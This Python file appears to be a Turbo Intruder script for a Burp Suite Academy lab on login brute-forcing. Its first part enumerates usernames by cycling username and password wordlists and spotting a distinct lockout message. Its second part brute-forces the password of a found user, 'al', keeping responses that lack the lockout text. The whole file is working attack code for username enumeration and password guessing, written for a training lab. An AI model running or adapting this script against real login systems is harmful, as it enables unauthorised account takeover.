def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=1, # The lab webserver does not seem to support multiple requests per connection
                           pipeline=False
                           )
    engine.start()
                           
    for username in open('/home/kiddie/Documents/BurpSuiteAcademy/AccessControl/Bruteforcing/usernames.txt'):
        for word in open('/home/kiddie/Documents/BurpSuiteAcademy/AccessControl/Bruteforcing/password_shortened.txt'): # Password.txt is tail to create the shortened version
            engine.queue(target.req, [username.rstrip() , word.rstrip()])


def handleResponse(req, interesting):
    if 'Invalid username or password.' not in req.response: # Valid username will show lockout message
        table.add(req)


# Bruteforce the password for the valid user account found
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    engine.start()
                           
    for word in open('/home/kiddie/Documents/BurpSuiteAcademy/AccessControl/Bruteforcing/password.txt'):
        engine.queue(target.req, ['al', word.rstrip()])


def handleResponse(req, interesting):
    if 'You have made too many incorrect login attempts.' not in req.response:
        table.add(req)
